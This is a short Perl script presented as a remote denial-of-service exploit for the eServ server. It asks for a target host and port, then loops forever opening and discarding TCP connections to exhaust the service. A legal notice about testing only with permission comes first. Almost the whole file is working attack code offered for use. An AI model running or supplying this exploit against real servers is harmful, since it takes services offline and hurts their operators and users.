#!/usr/bin/perl
#LEGAL NOTICE: Don't test this on networks you don't administer,
#and do not test this tool on networks you don't own without
#permission of the network owner.  You are responsible for all
#damage due to your use of this tool.
use IO::Socket;
print "$0: eServ Remote DoS Exploit\r\n";
print "By Matthew Murphy \<mattmurphy\@kc.rr.com\>\r\n\r\n";
print "Server hostname\: ";
$host = trim(chomp($line = <STDIN>));
print "Service port to probe\: ";
$port = trim(chomp($line = <STDIN>));
print "\r\nBeginning probe -- stop with CTRL+C\r\n";
while (1) {
 $f = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$host:$port");
 undef $f;
}
